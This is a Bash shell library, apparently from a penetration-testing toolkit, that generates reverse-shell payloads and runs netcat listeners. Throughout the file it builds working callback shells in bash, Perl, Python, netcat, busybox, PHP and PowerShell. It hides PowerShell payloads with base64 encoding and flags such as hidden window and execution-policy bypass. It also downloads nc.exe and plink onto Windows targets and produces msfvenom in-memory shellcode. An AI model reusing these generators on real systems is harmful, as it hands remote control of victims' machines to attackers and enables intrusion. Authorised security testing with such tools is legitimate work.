#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source $SCRIPTDIR/general.sh
source $SCRIPTDIR/network.sh


prepare_generic_linux_shell() {
    if [ -z "$host_port" ]; then
        host_port=4444  # Default reverse shell port
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
}

get_bash_reverse_shell() {
    prepare_generic_linux_shell
    local reverse_shell='bash -i >& /dev/tcp/'"$host_ip"'/'"$host_port"' 0>&1'
    if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
        reverse_shell='nohup '"$reverse_shell"' &'
    fi
    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
        reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
        reverse_shell="{\"bash\", \"-c\" , \"$reverse_shell\"}"
    elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then
        reverse_shell="bash -c \"$reverse_shell\""
    fi
    echo "$reverse_shell"
}

get_perl_reverse_shell() {
    prepare_generic_linux_shell
    local reverse_shell=''\''use Socket;$i="'"$host_ip"'";$p='"$host_port"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\'''
    if [[ ! -z $return_minimal ]] && [[ $return_minimal == "true" ]]; then
        echo "$reverse_shell"
    else
        reverse_shell="perl -e $reverse_shell"
        echo "$reverse_shell"
    fi
}
get_python_reverse_shell() {
    prepare_generic_linux_shell
    local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
    local python_exe=""
    if [[ -z $python_version ]]; then
        python_exe="python3"
    elif [[ $python_version == "2" ]]; then
        python_exe="python"
    elif [[ $python_version == "3" ]]; then
        python_exe="python3"
    else
        python_exe="python3"
    fi

    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
        #reverse_shell=$(echo $reverse_shell | sed 's/"/\\"/g')
        reverse_shell="{\"$python_exe\", \"-c\" , \"$reverse_shell\"}"
    elif [[ -z "$return_minimal" ]] || [[ "$return_minimal" == "false" ]]; then
        reverse_shell="$python_exe -c '$reverse_shell'"

    fi
    echo "$reverse_shell"
}
get_nc_reverse_shell() {
    prepare_generic_linux_shell
    local reverse_shell='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '"$host_ip"' '"$host_port"' >/tmp/f'
    if [[ ! -z "$java_exec" ]] && [[ $java_exec == "true" ]]; then
        reverse_shell="/bin/sh $host_ip $host_port"
        reverse_shell="{\"nc\", \"-c\" , \"$reverse_shell\"}"
    fi
    echo "$reverse_shell"
}

get_busybox_reverse_shell() {
    prepare_generic_linux_shell
    local reverse_shell='busybox nc '"$host_ip"' '"$host_port"' -e /bin/sh'
    if [[ -z "$no_hup" ]] || [[ "$no_hup" == "true" ]]; then
        reverse_shell='nohup '"$reverse_shell"' &'
    fi
    echo "$reverse_shell"
}

get_php_reverse_shell() {
    prepare_generic_linux_shell
    local reverse_shell="\$sock=fsockopen(\"$host_ip\",$host_port);\$proc=proc_open(\"/bin/sh -i\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);"
    if [[ ! -z $return_minimal ]] && [[ $return_minimal == "true" ]]; then
        echo "$reverse_shell"
    else
        reverse_shell="php -r '$reverse_shell'"
        echo "$reverse_shell"
    fi
}

encode_powershell() {
    if [ -z "$1" ]; then
        echo "Usage: powershell_base64 <string>"
        return 1
    fi
    local input_string="$1"
    if [[ "$input_string" == "powershell"* ]]; then
        # Assume already encoded
        echo "$input_string"
        return 0
    fi
    local encoded_string=""
    encoded_string=$(echo "$input_string" | iconv -t UTF-16LE | base64 | tr -d '\n')
    if [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "simple" ]]; then
        echo "powershell -ec $encoded_string"
    elif [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "short" ]]; then
        echo "$encoded_string"
    elif [[ ! -z "$encoding_type" ]] && [[ "$encoding_type" == "long" ]]; then
        encoded_string=$(echo "$input_string" | base64 | tr -d '\n')
        echo "powershell -Command \"\$Bytes=[System.Convert]::FromBase64String('$encoded_string');\$DecodedCommand=[System.Text.Encoding]::UTF8.GetString(\$Bytes);Invoke-Expression \$DecodedCommand\""
    else
        echo "powershell -ep bypass -w hidden -nop -nol -noni -ec $encoded_string"
    fi
}


get_powershell_reverse_shell() {    
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444
    fi
    if [ ! -z "$2" ]; then
        host_ip=$2
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_shell.ps1 | sed -E 's/^\$host_port=.*/\$host_port='$host_port';/g' | sed -E 's/^\$host_ip=.*/\$host_ip="'$host_ip'";/g' )
    reverse_shell=$(echo "$reverse_shell" | tr '\n' ' ' | sed -E 's/[[:space:]][[:space:]]+/\ /g')
    if [ "$encode_shell" == "false" ]; then
        echo "$reverse_shell"
        return 0
    fi
    echo $(encode_powershell "$reverse_shell")
}

get_powershell_reverse_shell_cmd() {    
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444
    fi
    if [ ! -z "$2" ]; then
        host_ip=$2
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_shell_cmd.ps1 | sed -E 's/^\$host_port=.*/\$host_port='$host_port';/g' | sed -E 's/^\$host_ip=.*/\$host_ip="'$host_ip'";/g' )
    reverse_shell=$(echo "$reverse_shell" | tr '\n' ' ' | sed -E 's/[[:space:]][[:space:]]+/\ /g')
    reverse_shell=$(echo "$reverse_shell" | sed -E 's/ =/=/g' | sed -E 's/= /=/g' | sed -E 's/; /;/g')
    reverse_shell=$(echo "$reverse_shell" | sed -E 's/ \{/\{/g' | sed -E 's/\{ /\{/g' | sed -E 's/ \}/\}/g' | sed -E 's/\} /\}/g')
    reverse_shell=$(echo "$reverse_shell" | sed -E 's/if /if/g' | sed -E 's/while /while/g' | sed -E 's/try /try/g')
    if [ "$encode_shell" == "false" ]; then
        echo "$reverse_shell"
        return 0
    fi
    echo $(encode_powershell "$reverse_shell")
}

get_powercat_reverse_shell() {
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444
    fi
    if [ ! -z "$2" ]; then
        host_ip=$2
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    cp /usr/share/windows-resources/powercat/powercat.ps1 .
    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_shell_powercat.ps1 |sed -E 's/\$\{http_ip\}/'$http_ip'/g' | sed -E 's/\$\{http_port\}/'$http_port'/g' | sed -E 's/\$\{host_port\}/'$host_port'/g' | sed -E 's/\$\{host_ip\}/'$host_ip'/g' )
    reverse_shell=$(echo "$reverse_shell" | tr '\n' ' ' | sed -E 's/[[:space:]][[:space:]]+/\ /g')
    if [[ ! -z $background_shell ]] && [[ "$background_shell" == "false" ]]; then
        reverse_shell=$(echo "$reverse_shell" | sed -E 's/\$background = \$true/\$background = \$false/g')
    fi
    if [ "$encode_shell" == "false" ]; then
        echo "$reverse_shell"
        return 0
    fi
    echo $(encode_powershell "$reverse_shell")
}

get_powershell_interactive_shell() {
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444
    fi
    if [ ! -z "$2" ]; then
        host_ip=$2
    fi
    if [ -z "$host_ip" ]; then
        host_ip=$(get_host_ip)  # Function to get the host IP address
    fi
    if [ -z "$http_ip" ]; then
        echo "HTTP IP address must be set before running interactive shell."
        return 1
    fi
    if [ -z "$http_port" ]; then
        echo "HTTP port must be set before running interactive shell."
        return 1
    fi
    local shell_file_name="reverse_interactive_shell_${host_ip}_${host_port}.ps1"
    cp $SCRIPTDIR/../ps1/reverse_interactive_shell.ps1 $shell_file_name
    sed -i -E 's/\{host_port\}/"'$host_port'";/g' $shell_file_name
    sed -i -E 's/\{host_ip\}/"'$host_ip'";/g' $shell_file_name
    local stty_size=$(stty size)
    local stty_rows=$(echo "$stty_size" | awk '{print $1}')
    local stty_cols=$(echo "$stty_size" | awk '{print $2}')
    sed -i -E 's/\{stty_rows\}/"'$stty_rows'";/g' $shell_file_name
    sed -i -E 's/\{stty_cols\}/"'$stty_cols'";/g' $shell_file_name    
    reverse_shell=$(cat $SCRIPTDIR/../ps1/reverse_interactive_shell_stub.ps1 | sed -E 's/\$\{http_ip\}/'$http_ip'/g' | sed -E 's/\$\{http_port\}/'$http_port'/g' | sed -E 's/\$\{filename\}/'$shell_file_name'/g')
    if [[ ! -z "$powershell_additional_commands" ]]; then
        reverse_shell=$(echo "$reverse_shell" | sed -E 's/\$\{additional_commands\}/'$powershell_additional_commands'/g')
    fi
    if [[ ! -z $background_shell ]] && [[ "$background_shell" == "false" ]]; then
        reverse_shell=$(echo "$reverse_shell" | sed -E '/Start-Process/d')
    else
        reverse_shell=$(echo "$reverse_shell" | sed -E '/\. \.\\/d')
    fi
    if [ "$encode_shell" == "false" ]; then
        echo "$reverse_shell"
        return 0
    fi
    echo $(encode_powershell "$reverse_shell")

}

get_windows_binaries_powershell() {
    local windows_binary="$1"
    if [ -z "$windows_binary" ]; then
        echo "Windows binary must be specified."
        return 1
    fi
    windows_binary_fullpath="/usr/share/windows-resources/binaries/$windows_binary"
    if [ -f "$windows_binary_fullpath" ]; then
        cp "$windows_binary_fullpath" .
    fi
    if [ -f "$windows_binary" ]; then
        if [ -z "$http_ip" ]; then
            echo "HTTP IP address must be set before running interactive shell."
            return 1
        fi
        if [ -z "$http_port" ]; then
            echo "HTTP port must be set before running interactive shell."
            return 1
        fi        
        download="iwr -Uri http://$http_ip:$http_port/plink.exe -OutFile"' C:\windows\temp\plink.exe;'
        if [ "$encode_shell" == "false" ]; then
            echo "$download"
            return 0
        fi
        echo $(encode_powershell "$download")
      fi
}

get_nc_reverse_shell_powershell() {
    cp /usr/share/windows-resources/binaries/nc.exe .
    if [ -f "nc.exe" ]; then
        if [ -z "$host_port" ]; then
            host_port=4444  # Default reverse shell port
        fi
        if [ -z "$host_ip" ]; then
            host_ip=$(get_host_ip)  # Function to get the host IP address
        fi
        if [ -z "$http_ip" ]; then
            echo "HTTP IP address must be set before running interactive shell."
            return 1
        fi
        if [ -z "$http_port" ]; then
            echo "HTTP port must be set before running interactive shell."
            return 1
        fi        
        reverse_shell="iwr -Uri http://$http_ip:$http_port/nc.exe -OutFile"' C:\windows\temp\nc.exe;'
        reverse_shell+='C:\windows\temp\nc.exe '"$host_ip $host_port -e cmd.exe"
        if [ "$encode_shell" == "false" ]; then
            echo "$reverse_shell"
            return 0
        fi
        echo $(encode_powershell "$reverse_shell")
     fi

}

get_powershell_in_memory_shell() {

    if [[ -z $host_port ]]; then
        host_port=4444  # Default reverse shell port
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
    fi
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=$host_ip LPORT=$host_port -f psh-reflection -o payload.ps1 >> $trail_log
    cp $SCRIPTDIR/../ps1/reverse_shell_in_memory.ps1 .
    cat payload.ps1 >> reverse_shell_in_memory.ps1
    rm payload.ps1
    local cmd=$(cat reverse_shell_in_memory.ps1)
    encoding_type="long"    
    cmd=$(encode_powershell "$cmd")
    echo "$cmd"
}

start_listener() {
    if [ -z "$host_port" ]; then
        host_port=4444  # Default reverse shell port
    fi
    if [ -z "$log_dir" ]; then
        log_dir="./log"
    fi
    local stty_size=$(stty size)
    local terminal_type=$(echo $TERM)
    local stty_rows=$(echo "$stty_size" | awk '{print $1}')
    local stty_columns=$(echo "$stty_size" | awk '{print $2}')
    echo "stty rows: $stty_rows, columns: $stty_columns"
    echo "terminal type: $terminal_type"
    echo "Starting listener on port $host_port..."
    echo "/bin/sh -i"
    echo "/usr/bin/script -qc /bin/bash /dev/null"
    echo "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    echo "python3 -c 'import pty; pty.spawn(\"/bin/sh\")'"
    echo "Ctrl-Z"
    echo "stty -a"
    echo "stty raw -echo; fg"
    echo "export TERM=$terminal_type; export SHELL=bash; stty rows $stty_rows columns $stty_columns; reset"
    echo "export TERM=$terminal_type; export SHELL=sh; stty rows $stty_rows columns $stty_columns; reset"
    netcat_options="-k -l -v -n -p $host_port"
    echo "Netcat options: $netcat_options"
    # for interactive
    if [ ! -z "$interactive_shell" ]; then
        stty raw -echo; (stty size; cat) | nc $netcat_options 2>&1 | tee >(remove_color_to_log >> "$log_dir/listener_$host_port.log")
    else
        nc $netcat_options 2>&1 | tee >(remove_color_to_log >> "$log_dir/listener_$host_port.log")
    fi
}

is_listener_running() {
    if [ ! -z "$1" ]; then
        host_port=$1
    fi
    if [ -z "$host_port" ]; then
        host_port=4444  # Default reverse shell port
    fi
    running=$(pgrep -f "nc -k -l -v -n -p $host_port")
    if [[ $running ]]; then
        echo "Listener is running on port $host_port."
        return 0
    else
        echo "No listener is running on port $host_port."
        return 1
    fi
}

find_ready_listener_port() {
    local start_port=4444
    while is_listener_running $start_port > /dev/null; do
        #echo "Port $start_port is already in use. Trying next port..."
        start_port=$((start_port + 1))
    done
    echo "$start_port"
}

stop_listener() {
    local listener_pid=$(pgrep -f "nc -k -l -v -n -p $host_port")
    if [[ $listener_pid ]]; then
        kill -9 $listener_pid
        echo "Listener on port $host_port stopped."
    else
        echo "No listener found on port $host_port."
    fi
  
}

get_listener_command() {
    if [[ ! -z "$1" ]]; then
        host_port=$1
    fi
    local interactive=""
    if [[ ! -z "$2" ]]; then
        interactive=$2
    fi
    if [[ -z $host_ip ]]; then
        host_ip=$(get_host_ip)
    fi
    echo $COMMONDIR/start_listener.sh "$project" "$host_port" "$interactive"
}

is_listener_connected() {
    local target_ip=""
    if [[ -z $1 ]]; then
        echo "The target_ip not specified, using the default $ip"        
        target_ip=$ip
    else
        target_ip=$1
    fi
    if ss -tpn | grep "$host_port.*$target_ip"; then
        echo "Listener is connected to $target_ip on port $host_port."
        return 0
    else
        echo "Listener is not connected to $target_ip on port $host_port."
        return 1
    fi
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then

    if [[ "$1" == "get_bash_reverse_shell" ]]; then
        get_bash_reverse_shell "$2"
    elif [[ "$1" == "get_powershell_reverse_shell" ]]; then
        get_powershell_reverse_shell "$2" "$3"
    elif [[ "$1" == "get_powershell_reverse_shell_cmd" ]]; then
        get_powershell_reverse_shell_cmd "$2" "$3"
    elif [[ "$1" == "get_powershell_interactive_shell" ]]; then
        get_powershell_interactive_shell "$2" "$3"
    elif [[ "$1" == "get_windows_binaries_powershell" ]]; then
        get_windows_binaries_powershell "$2"
    elif [[ "$1" == "get_nc_reverse_shell_powershell" ]]; then
        get_nc_reverse_shell_powershell
    elif [[ "$1" == "start_listener" ]]; then
        start_listener
    elif [[ "$1" == "is_listener_running" ]]; then
        is_listener_running "$2"
    elif [[ "$1" == "find_ready_listener_port" ]]; then
        find_ready_listener_port
    elif [[ "$1" == "stop_listener" ]]; then
        stop_listener
    else
        echo "Unknown command: $1"
        exit 1
    fi
fi